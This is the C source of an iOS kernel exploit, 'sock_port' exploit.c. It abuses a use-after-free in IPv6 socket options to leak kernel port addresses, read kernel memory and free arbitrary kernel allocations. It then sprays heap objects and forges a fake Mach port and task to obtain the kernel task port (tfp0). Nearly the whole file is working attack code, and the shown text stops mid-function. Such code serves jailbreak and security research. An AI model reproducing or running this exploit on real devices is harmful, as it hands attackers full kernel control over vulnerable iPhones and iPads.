//
//  exploit.c
//  sock_port
//
//  Created by Jake James on 7/17/19.
//  Copyright Â© 2019 Jake James. All rights reserved.
//

#include "exploit.h"

bool islegacy(void){
    if (@available(iOS 10.0, *)) {
        return false;
    }
    return true;
}

// utilities to manipulate sockets
int set_minmtu(int sock, int *minmtu) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

int get_minmtu(int sock, int *minmtu) {
    socklen_t size = sizeof(*minmtu);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

int get_prefertempaddr(int sock, int *prefertempaddr) {
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

int set_prefertempaddr(int sock, int *prefertempaddr) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, sizeof(*prefertempaddr));
}

int get_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

int set_pktinfo(int sock, struct in6_pktinfo *pktinfo) {
    return setsockopt(sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

// free the pktopts struct of the socket to get ready for UAF
int free_socket_options(int sock) {
    return disconnectx(sock, 0, 0);
}

// return a socket we can UAF on
int get_socket(void) {
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0) {
        printf("[-] Can't get socket, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret) {
        printf("[-] setsockopt() failed, error %d (%s)\n", errno, strerror(errno));
        return -1;
    }
    
    return sock;
}

// return a socket ready for UAF
int get_socket_with_dangling_options(void) {
    int socket = get_socket();
    
    int minmtu = -1;
    set_minmtu(socket, &minmtu);
    
    free_socket_options(socket);
    
    return socket;
}

mach_port_t new_port(void) {
    mach_port_t port;
    kern_return_t rv = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (rv) {
        printf("[-] Failed to allocate port (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    rv = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (rv) {
        printf("[-] Failed to insert right (%s)\n", mach_error_string(rv));
        return MACH_PORT_NULL;
    }
    return port;
}

// first primitive: leak the kernel address of a mach port
addr_t find_port_via_uaf(mach_port_t port, int disposition) {
    int retry = 0;
    int sock  = 0;
    
retry:
    // here we use the uaf as an info leak
    sock = get_socket_with_dangling_options();
    for (int i = 0; i < 50; i++) {
        // since the UAFd field is 192 bytes, we need 192/sizeof(uint64_t) pointers
        mach_port_t p = fill_kalloc_with_port_pointer(port, 192/sizeof(addr_t), MACH_MSG_TYPE_COPY_SEND);
        if(p == MACH_PORT_NULL)
        {
            goto end1;
        }
        
        int mtu;
        int pref;
        get_minmtu(sock, &mtu); // this is like doing rk32(options + 180);
        get_prefertempaddr(sock, &pref); // this like rk32(options + 184);
#ifdef __LP64__
        addr_t ptr = (((uint64_t)mtu << 32) & 0xffffffff00000000) | ((uint64_t)pref & 0x00000000ffffffff);
        if (mtu >= 0xffffff00 && mtu != 0xffffffff && pref != 0xdeadbeef)
#else
        addr_t ptr = mtu;
        if (mtu != 0xffffffff && mtu != 0 && pref != 0xdeadbeef && mtu == pref)
#endif
        {
            mach_port_destroy(mach_task_self(), p);
            close(sock);
            return ptr;
        }
    end1:
        if(p != MACH_PORT_NULL)
        {
            mach_port_destroy(mach_task_self(), p);
        }
    }
    
    // close that socket.
    close(sock);
    retry++;
    if(retry < 10)
    {
        goto retry;
    }
    printf("failed to leak port address\n");
    return -1;
}

addr_t our_task_addr = 0;
// function to cache our task port kernel address
addr_t task_self_addr(void) {
    our_task_addr = find_port_via_uaf(mach_task_self(), MACH_MSG_TYPE_COPY_SEND);
    return our_task_addr;
}

// second primitive: read 20 bytes from addr
void* read_20_via_uaf(addr_t addr) {
    
    int offset = 0;
#ifdef __LP64__
    offset = 164;
#else
    offset = 116;
#endif
    
    // create a bunch of sockets
    int sockets[128];
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    fake_opts->ip6po_minmtu = 0x41424344; // give a number we can recognize ... ios 11-12
    *(uint32_t*)((addr_t)fake_opts + offset) = 0x41424344; // ios 8 - 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        if (islegacy()) {
            spray_OSSerialize((void*)fake_opts, sizeof(struct ip6_pktopts));
        } else {
            spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
        }
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == 0x41424344) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] Failed to read kernel\n");
        // closing all sockets
        for (int i = 0; i < 128; i++) {
            close(sockets[i]);
        }
        return 0;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    get_pktinfo(sockets[found_at], (struct in6_pktinfo *)buf);
    close(sockets[found_at]);
    
    return buf;
}


uint64_t rk64_via_uaf(addr_t addr) {
    int i = 0;
    void *buf = malloc(20);
    while(i < 20) {
        buf = read_20_via_uaf(addr);
        if(buf != 0) {
            break;
        }
        i++;
    }
    if (buf) {
        uint64_t r = *(uint64_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

uint32_t rk32_via_uaf(addr_t addr) {
    int i = 0;
    void *buf = malloc(20);
    while(i < 20) {
        buf = read_20_via_uaf(addr);
        if(buf != 0) {
            break;
        }
        i++;
    }
    if (buf) {
        uint32_t r = *(uint32_t*)buf;
        free(buf);
        return r;
    }
    return 0;
}

addr_t rkptr_via_uaf(addr_t addr) {
#ifdef __LP64__
    return rk64_via_uaf(addr);
#else
    return rk32_via_uaf(addr);
#endif
}

// third primitive: free a kalloced object at an arbitrary address
int free_via_uaf(addr_t addr) {
    uint32_t num;
    if (islegacy()) {
        num = 0xcafebabe;
    } else {
        num = 0x41424344;
    }
    
    int offset = 0;
#ifdef __LP64__
    offset = 164;
#else
    offset = 116;
#endif
    
    // so add sizeof(addr_t) to the address
    if (islegacy()) {
        addr += sizeof(addr_t); // haxx
    }
    
    // create a bunch of sockets
    int sockets[128];
    
    for (int i = 0; i < 128; i++) {
        sockets[i] = get_socket_with_dangling_options();
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fake_opts = calloc(1, sizeof(struct ip6_pktopts));
    if (!islegacy()) {
        fake_opts->ip6po_minmtu = num; // give a number we can recognize
    }
    *(uint32_t*)((uint64_t)fake_opts + 164) = num; // on iOS 10, offset is different
    fake_opts->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    bool found = false;
    int found_at = -1;
    
    for (int i = 0; i < 20; i++) { // iterate through the sockets to find if we overwrote one
        if (islegacy()) {
            spray_OSSerialize((void*)fake_opts, sizeof(struct ip6_pktopts));
        } else {
            spray_IOSurface((void *)fake_opts, sizeof(struct ip6_pktopts));
        }
        
        for (int j = 0; j < 128; j++) {
            int minmtu = -1;
            get_minmtu(sockets[j], &minmtu);
            if (minmtu == num) { // found it!
                found_at = j; // save its index
                found = true;
                break;
            }
        }
        if (found) break;
    }
    
    free(fake_opts);
    
    if (!found) {
        printf("[-] failed to setup freeing primitive\n");
        return -1;
    }
    
    for (int i = 0; i < 128; i++) {
        if (i != found_at) {
            close(sockets[i]);
        }
    }
    struct in6_pktinfo *buf = malloc(sizeof(struct in6_pktinfo));
    memset(buf, 0, sizeof(struct in6_pktinfo));
    
    int ret = set_pktinfo(sockets[found_at], buf);
    free(buf);
    return ret;
}

static inline uint32_t mach_port_waitq_flags(void) {
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

addr_t _kslide;
addr_t get_kslide_anchor(void)
{
    if(!_kslide) {
        addr_t anchor, kslide;
        if(get_kernel_anchor(&anchor) != KERN_SUCCESS) {
            printf("[-] Failed getting kernel anchor!\n");
            return 0;
        } else {
            printf("[i] anchor: " ADDR"\n", anchor);
            addr_t kernel_base = 0;
#ifdef __LP64__
            kernel_base = (anchor & 0xfffffffffff00000) + 0x4000;
            for(uint32_t val = 0; 1; kernel_base -= 0x100000)
            {
                val = kread32_sp(kernel_base);
                if(val == MH_MAGIC_64)
                {
                    break;
                }
            }
#else
            kernel_base = (anchor & 0xFFF00000) + 0x1000;
#endif
            printf("[i] kernel base: " ADDR"\n", kernel_base);
            kslide = kernel_base - KERNEL_BASE_ADDRESS9;
        }
        _kslide = kslide;
        return kslide;
    }
    return _kslide;
}

addr_t get_kslide_new(void)
{
    if(!_kslide) {
        //from async_wake_ios
        addr_t kernel_base = 0;
        addr_t kslide = 0;
        
        uint64_t hostport_addr = find_port(mach_host_self());
        uint64_t realhost = kread64_sp(hostport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
        kernel_base = realhost & ~0xfffULL;
        for (int i = 0; i < 0x10000; i++) {
            if (kread32_sp(kernel_base) == MACH_MAGIC) {
                break;
            }
            kernel_base -= 0x1000;
        }
        printf("[*] Kernel base: 0x%llx\n", kernel_base);
        kslide = kernel_base - 0xFFFFFFF007004000;
        _kslide = kslide;
        return kslide;
    }
    return _kslide;
}

addr_t self_port_addr;
mach_port_t get_tfp0(void) {
    printf("[!] exploit started!\n");
    
    offsets_init();
    
    kern_return_t ret = 0;
    if (!islegacy()) {
        ret = init_IOSurface();
        if (ret) {
            printf("[-] can't init IOSurface!\n");
            return MACH_PORT_NULL;
        }
        printf("[+] initialized IOSurface\n");
    }
    
    bool SMAP = false;
    if (pagesize == 0x4000) {
        struct utsname a;
        uname(&a);
        if (!strstr(a.machine, "iPad5,") && !strstr(a.machine, "iPad6,") && !strstr(a.machine, "iPhone8,")) {
            printf("[i] detected SMAP device\n");
            SMAP = true;
        }
    }
    
    self_port_addr = task_self_addr(); // port leak primitive
    if (!self_port_addr) {
        printf("[-] failed to leak our task port address!\n");
        goto err;
    }
    
    printf("[i] our task port: " ADDR "\n", self_port_addr);
    
    // kernel read primitive
    addr_t ipc_space_kernel = rkptr_via_uaf(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER));
    if (!ipc_space_kernel) {
        printf("[-] kernel read primitive failed!\n");
        goto err;
    }
    printf("[i] ipc_space_kernel: " ADDR "\n", ipc_space_kernel);
    
    // here we'll create a pair of pipes (4 file descriptors in total)
    // first pipe, used to overwrite a port pointer in a mach message
    int fds[2];
    ret = pipe(fds);
    if (ret) {
        printf("[-] failed to create pipe\n");
        goto err;
    }
    
    // make the buffer of the first pipe 0x10000 bytes (this could be other sizes, but know that kernel does some calculations on how big this gets, i.e. when I made the buffer 20 bytes, it'd still go to kalloc.512
#ifdef __LP64__
    static const size_t PIPEBUF_SIZE = 0x10000;
#else
    static const size_t PIPEBUF_SIZE = 0x8000;
#endif
    uint8_t pipebuf[PIPEBUF_SIZE];
    memset(pipebuf, 0, PIPEBUF_SIZE);
    *(addr_t*)(pipebuf) = 0x10000; // it's not a mistake.
    
    write(fds[1], pipebuf, PIPEBUF_SIZE); // do write() to allocate the buffer on the kernel
    read(fds[0], pipebuf, PIPEBUF_SIZE); // do read() to reset buffer position
    write(fds[1], pipebuf, sizeof(addr_t)); // write 8 bytes so later we can read the first 8 bytes (used to verify if spraying worked)
    
    // second pipe, used for our fake port
    int port_fds[2] = {-1, -1};
    if (SMAP) {
        ret = pipe(port_fds);
        if (ret) {
            printf("[-] failed to create pipe\n");
            goto err;
        }
    }
#ifndef __LP64__
    ret = pipe(port_fds);
    if (ret) {
        printf("[-] failed to create pipe\n");
        goto err;
    }
#endif
    
#ifdef __LP64__
    size_t FAKE_TASK_SIZE = 0x600;
#else
    size_t FAKE_TASK_SIZE = 0x208;
#endif
    // create fake port and fake task, put fake_task right after fakeport
    
    addr_t fakeport_addr = 0;
    addr_t fake_task_addr = 0;
    if(islegacy()) {
        kport_t *fakeport = malloc(sizeof(kport_t) + FAKE_TASK_SIZE);
        ktask_t *fake_task = (ktask_t *)((addr_t)fakeport + sizeof(kport_t));
        bzero((void *)fakeport, sizeof(kport_t) + FAKE_TASK_SIZE);
        
        fake_task->ref_count = 0xff;
        
        fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
        fakeport->ip_references = 0xd00d;
        fakeport->ip_lock.type = 0x11;
        fakeport->ip_messages.port.receiver_name = 1;
        fakeport->ip_messages.port.msgcount = 0;
        fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
        fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
        fakeport->ip_srights = 99;
        fakeport->ip_kobject = 0;
        fakeport->ip_receiver = ipc_space_kernel;
        
        fakeport_addr = (addr_t)fakeport;
        fake_task_addr = (addr_t)fake_task;
    } else {
        kport10_t *fakeport = malloc(sizeof(kport10_t) + FAKE_TASK_SIZE);
        ktask10_t *fake_task = (ktask10_t *)((addr_t)fakeport + sizeof(kport10_t));
        bzero((void *)fakeport, sizeof(kport10_t) + FAKE_TASK_SIZE);
        
        fake_task->ref_count = 0xff;
        
        fakeport->ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
        fakeport->ip_references = 0xd00d;
        fakeport->ip_lock.type = 0x11;
        fakeport->ip_messages.port.receiver_name = 1;
        fakeport->ip_messages.port.msgcount = 0;
        fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
        fakeport->ip_messages.port.waitq.flags = mach_port_waitq_flags();
        fakeport->ip_srights = 99;
        fakeport->ip_kobject = 0;
        fakeport->ip_receiver = ipc_space_kernel;
        
        fakeport_addr = (addr_t)fakeport;
        fake_task_addr = (addr_t)fake_task;
        
        if (SMAP) {
            write(port_fds[1], (void *)fakeport, sizeof(kport_t) + 0x600);
            read(port_fds[0], (void *)fakeport, sizeof(kport_t) + 0x600);
        }
    }

#ifndef __LP64__
    if(islegacy()) {
        write(port_fds[1], (void *)(kport_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
        read(port_fds[0], (void *)(kport_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
    } else {
        write(port_fds[1], (void *)(kport10_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
        read(port_fds[0], (void *)(kport10_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
    }
#endif
    
    // find the pipe buffers for both pipes
    
#define rkptr_check(addr) ({ addr_t r; r = rkptr_via_uaf(addr); if (!r) { usleep(100); r = rkptr_via_uaf(addr); if (!r) { printf("[-] failed to read from '"#addr"'\n"); goto err;}}; r;})
    
    addr_t task = rkptr_check(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));
    addr_t proc = rkptr_check(task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    addr_t p_fd = rkptr_check(proc + koffset(KSTRUCT_OFFSET_PROC_P_FD));
    addr_t fd_ofiles = rkptr_check(p_fd + koffset(KSTRUCT_OFFSET_FILEDESC_FD_OFILES));
    
    addr_t fproc = rkptr_check(fd_ofiles + fds[0] * sizeof(addr_t));
    addr_t f_fglob = rkptr_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    addr_t fg_data = rkptr_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    addr_t pipe_buffer = rkptr_check(fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    printf("[*] pipe buffer: " ADDR "\n", pipe_buffer);
    
    addr_t port_fg_data = 0;
    addr_t port_pipe_buffer = 0;
    
#ifndef __LP64__
    fproc = rkptr_check(fd_ofiles + port_fds[0] * sizeof(addr_t));
    f_fglob = rkptr_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
    port_fg_data = rkptr_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
    port_pipe_buffer = rkptr_check(port_fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
    printf("[*] second pipe buffer: " ADDR "\n", port_pipe_buffer);
#endif
    
#ifndef __LP64__
    // align ip_kobject at our fake task, so the address of fake port + sizeof(kport_t)
    *(addr_t*)(fakeport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = port_pipe_buffer + sizeof(kport_t);
    // update our pipe buffer
    if(islegacy()) {
        write(port_fds[1], (void *)(kport_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
    } else {
        write(port_fds[1], (void *)(kport10_t *)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
    }
#else
    if(islegacy()) {
        ((kport_t*)fakeport_addr)->ip_kobject = (uint64_t)fake_task_addr;
    } else {
        if (SMAP) {
            fproc = rkptr_check(fd_ofiles + port_fds[0] * 8);
            f_fglob = rkptr_check(fproc + koffset(KSTRUCT_OFFSET_FILEPROC_F_FGLOB));
            port_fg_data = rkptr_check(f_fglob + koffset(KSTRUCT_OFFSET_FILEGLOB_FG_DATA));
            port_pipe_buffer = rkptr_check(port_fg_data + koffset(KSTRUCT_OFFSET_PIPE_BUFFER));
            printf("[*] second pipe buffer:" ADDR"\n", port_pipe_buffer);
            
            ((kport10_t*)fakeport_addr)->ip_kobject = port_pipe_buffer + sizeof(kport10_t);
            write(port_fds[1], (void *)(kport10_t*)fakeport_addr, sizeof(kport_t) + 0x600);
        } else {
            ((kport10_t*)fakeport_addr)->ip_kobject = (uint64_t)fake_task_addr;
        }
    }
#endif

    
    // create a new port, this one we'll use for tfp0
    mach_port_t target = new_port();
    if (!target) {
        printf("[-] failed to allocate port\n");
        goto err;
    }
    
    // get its kernel address
    addr_t target_addr = find_port_via_uaf(target, MACH_MSG_TYPE_COPY_SEND);
    if (!target_addr) {
        printf("[-] failed to leak target port address\n");
        goto err;
    }
    
    // free the first pipe buffer
    ret = free_via_uaf(pipe_buffer);
    if (ret) {
        printf("[-] failed to free pipe buffer\n");
        goto err;
    }

    // reallocate it while filling it with a mach message containing send rights to our target port
    mach_port_t p = MACH_PORT_NULL;
    for (int i = 0; i < 10000; i++) {
        
        // pipe is 0x10000 bytes so make 0x10000/8 pointers and save result as we'll use later
        p = fill_kalloc_with_port_pointer(target, 0x10000/sizeof(addr_t), MACH_MSG_TYPE_COPY_SEND);
        
        // check if spraying worked by reading first 8 bytes
        addr_t addr;
        read(fds[0], &addr, sizeof(addr_t));
        if (addr == target_addr) { // if we see the address of our port, it worked
            break;
        }
        write(fds[1], &addr, sizeof(addr_t)); // reset buffer position
        
        mach_port_destroy(mach_task_self(), p); // spraying didn't work, so free port
        p = MACH_PORT_NULL;
    }

    if (!p) {
        printf("[-] spraying failed!\n");
        goto err;
    }
    
#ifdef __LP64__
    if(islegacy()) {
        kport_t *tmpport = (kport_t *)fakeport_addr;
        write(fds[1], &tmpport, sizeof(addr_t));
    } else {
        if(SMAP) {
            write(fds[1], &port_pipe_buffer, 8);
        } else {
            kport10_t *tmpport = (kport10_t *)fakeport_addr;
            write(fds[1], &tmpport, sizeof(addr_t));
        }
    }
#else
    // spraying worked, now the pipe buffer is filled with pointers to our target port
    // overwrite the first pointer with our second pipe buffer, which contains the fake port
    write(fds[1], &port_pipe_buffer, sizeof(addr_t));
#endif
    
    // receive the message from fill_kalloc_with_port_pointers back, since that message contains a send right and we overwrote the pointer of the first port, we now get a send right to the fake port!
    struct ool_msg *msg = malloc(0x1000);
    ret = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, p, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (ret) {
        free(msg);
        printf("[-] mach_msg() failed: %d (%s)\n", ret, mach_error_string(ret));
        goto err;
    }
    
    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t our_port = received_ports[0]; // fake port!
    free(msg);
    
    addr_t *read_addr_ptr = (addr_t *)(fake_task_addr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));
    
#ifdef __LP64__
#define kr32(addr, value)\
    if (SMAP) {\
    read(port_fds[0], (void *)((kport_t*)fakeport_addr), sizeof(kport_t) + 0x600);\
    }\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    if (SMAP) {\
        write(port_fds[1], (void *)((kport_t*)fakeport_addr), sizeof(kport_t) + 0x600);\
    }\
    ret = pid_for_task(our_port, (int *)&value);\
    if(ret != KERN_SUCCESS) printf("stage 1 read failed (%s)", mach_error_string(ret));
    
    uint32_t read64_tmp;
#define kr64(addr, value)\
    kr32(addr + 0x4, read64_tmp);\
    kr32(addr, value);\
    value = value | ((uint64_t)read64_tmp << 32)
   
#define krptr(addr, value) kr64(addr, value)
#else
    bool legacy = islegacy();
#define kr32(addr, value)\
    if(legacy) {\
    read(port_fds[0], (void *)(kport_t*)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    write(port_fds[1], (void *)(kport_t*)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);\
    } else {\
    read(port_fds[0], (void *)(kport10_t*)fakeport_addr, sizeof(kport10_t) + FAKE_TASK_SIZE);\
    *read_addr_ptr = addr - koffset(KSTRUCT_OFFSET_PROC_PID);\
    write(port_fds[1], (void *)(kport10_t*)fakeport_addr, sizeof(kport10_t) + FAKE_TASK_SIZE);\
    }\
    value = 0x0;\
    ret = pid_for_task(our_port, (int *)&value);
    
    
#define krptr(addr, value) kr32(addr, value)
#endif
    
    addr_t struct_task;
    krptr(self_port_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), struct_task);
    if (!struct_task) {
        printf("[-] kernel read failed!\n");
        goto err;
    }
    
    printf("[!] READING VIA FAKE PORT WORKED? " ADDR "\n", struct_task);
    printf("[+] Let's steal that kernel task port!\n");
    
    // tfp0!
    addr_t bsd_info = 0;
    addr_t kernel_task_addr = 0;
    addr_t kernel_vm_map = 0;
    uint32_t pid = 0;
    
    addr_t tmp_task_addr = struct_task;
    
    while (tmp_task_addr != 0) {
        
        krptr(tmp_task_addr + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO), bsd_info);
        if (!bsd_info) {
            printf("[-] kernel read failed!\n");
            goto err;
        }
        
        kr32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID), pid);
        
        if (pid == 0) {
            if(!islegacy()) {
                krptr(tmp_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), kernel_vm_map);
                if (!kernel_vm_map) {
                    printf("[-] failed to find kernel_vm_map address\n");
                    goto err;
                }
            }
#ifndef __LP64__
            krptr(tmp_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP), kernel_vm_map);
            if (!kernel_vm_map) {
                printf("[-] kernel read failed!\n");
                goto err;
            }
#endif
            kernel_task_addr = tmp_task_addr;
            break;
        }
        
        krptr(tmp_task_addr + koffset(KSTRUCT_OFFSET_TASK_PREV), tmp_task_addr);
    }
    
    if (!kernel_task_addr) {
        printf("[-] failed to find kernel_task address\n");
        goto err;
    }
    
    printf("[i] kernel_task_addr: " ADDR "\n", kernel_task_addr);
#ifndef __LP64__
    printf("[i] kernel_vm_map: " ADDR "\n", kernel_vm_map);
#endif
    
#ifdef __LP64__
# define TEST_WRITE_VALUE   (0x4141414141414141)
#else
# define TEST_WRITE_VALUE   (0x41414141)
#endif
    
    mach_port_t ktask = MACH_PORT_NULL;
    addr_t addr  = 0;
    addr_t readb = 0;
    
#ifdef __LP64__
    if(islegacy()) {
        *(addr_t*)(fakeport_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)) = kernel_task_addr;
        printf("[i] getting real kernel_task...\n");
        task_get_special_port(our_port, 1, &ktask);
        init_kernel_memory(ktask, self_port_addr);
    } else {
        read(port_fds[0], (void *)(kport10_t *)fakeport_addr, sizeof(kport10_t) + 0x600);
        
        ((ktask10_t *)fake_task_addr)->lock.data = 0x0;
        ((ktask10_t *)fake_task_addr)->lock.type = 0x22;
        ((ktask10_t *)fake_task_addr)->ref_count = 100;
        ((ktask10_t *)fake_task_addr)->active = 1;
        ((ktask10_t *)fake_task_addr)->map = kernel_vm_map;
        *(uint32_t *)((uint64_t)fake_task_addr + koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
        
        if (SMAP) {
            write(port_fds[1], (void *)(kport10_t *)fakeport_addr, sizeof(kport_t) + 0x600);
        }
        
        printf("[i] our_port: %x\n", our_port);
        init_kernel_memory(our_port, self_port_addr);
    }
#else
    // todo
    printf("[i] getting incomplete fake_task...\n");
    if(islegacy()) {
        read(port_fds[0], (void *)(kport_t*)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
        ((ktask_t *)fake_task_addr)->lock.data = 0x0;
        ((ktask_t *)fake_task_addr)->lock.type = 0x22;
        ((ktask_t *)fake_task_addr)->ref_count = 100;
        ((ktask_t *)fake_task_addr)->active = 1;
        *(addr_t*)(fake_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = kernel_vm_map;
        *(addr_t*)(fake_task_addr+ koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
        
        write(port_fds[1], (void *)(kport_t*)fakeport_addr, sizeof(kport_t) + FAKE_TASK_SIZE);
    } else {
        read(port_fds[0], (void *)(kport10_t*)fakeport_addr, sizeof(kport10_t) + FAKE_TASK_SIZE);
        ((ktask10_t *)fake_task_addr)->lock.data = 0x0;
        ((ktask10_t *)fake_task_addr)->lock.type = 0x22;
        ((ktask10_t *)fake_task_addr)->ref_count = 100;
        ((ktask10_t *)fake_task_addr)->active = 1;
        *(addr_t*)(fake_task_addr + koffset(KSTRUCT_OFFSET_TASK_VM_MAP)) = kernel_vm_map;
        *(addr_t*)(fake_task_addr+ koffset(KSTRUCT_OFFSET_TASK_ITK_SELF)) = 1;
        
        write(port_fds[1], (void *)(kport10_t*)fakeport_addr, sizeof(kport10_t) + FAKE_TASK_SIZE);
    }

    init_kernel_memory(our_port);
    
    printf("[i] creating incomplete fake port\n");
    mach_port_t new_fake_port = new_port();
    if (!new_fake_port) {
        printf("[-] failed to allocate port\n");
        goto err;
    }
    
    addr_t new_port_addr = 0;
    new_port_addr = find_port(new_fake_port, self_port_addr);
    if (!new_port_addr) {
        printf("[-] failed to find new incomplete tfp0 port address\n");
        goto err;
    }
    
    addr_t faketask = kalloc(FAKE_TASK_SIZE);
    if (!faketask) {
        printf("[-] failed to kalloc faketask\n");
        goto err;
    }
    
    kread(kernel_task_addr, fake_task, FAKE_TASK_SIZE);
    kwrite(faketask, fake_task, FAKE_TASK_SIZE);
    
    fakeport->ip_kobject = faketask;
    kwrite(new_port_addr, (const void*)fakeport, sizeof(kport_t));
    
    printf("[*] testing incomplete tfp0 port\n");
    
    init_kernel_memory(new_fake_port);
    addr = kalloc(sizeof(addr_t));
    if (!addr) {
        printf("[-] seems like the incomplete tfp0 port didn't work?\n");
        goto err;
    }
    wkptr(addr, TEST_WRITE_VALUE);
    readb = rkptr(addr);
    kfree(addr, sizeof(addr_t));
    
    printf("[*] read back: " ADDR "\n", readb);
    
    if (readb != TEST_WRITE_VALUE) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    printf("[i] getting real kernel_task...\n");
    task_get_special_port(new_fake_port, 1, &ktask);
    
    init_kernel_memory(ktask);
#endif
    
    addr = kalloc(sizeof(addr_t));
    if (!addr) {
        printf("[-] seems like tfp0 port didn't work?\n");
        goto err;
    }
    
    printf("[+] tfp0: 0x%x\n", ktask);
    printf("[*] allocated: " ADDR "\n", addr);
    kwriteptr_sp(addr, TEST_WRITE_VALUE);
    readb = kreadptr_sp(addr);
    kfree(addr, sizeof(addr_t));
    printf("[*] read back: " ADDR "\n", readb);
    
    if (readb != TEST_WRITE_VALUE) {
        printf("[-] read back value didn't match\n");
        goto err;
    }
    
    mach_port_t new_tfp0 = MACH_PORT_NULL;
    if(!islegacy()) {
        printf("[*] creating safer port\n");
        
        new_tfp0 = new_port();
        if (!new_tfp0) {
            printf("[-] failed to allocate new tfp0 port\n");
            goto err;
        }
        
        uint64_t new_addr = find_port(new_tfp0);
        if (!new_addr) {
            printf("[-] failed to find new tfp0 port address\n");
            goto err;
        }
        
        uint64_t faketask = kalloc(0x600);
        if (!faketask) {
            printf("[-] failed to kalloc faketask\n");
            goto err;
        }
        
        kwritebuf_sp(faketask, (ktask10_t *)fake_task_addr, 0x600);
        ((kport10_t *)fakeport_addr)->ip_kobject = faketask;
        
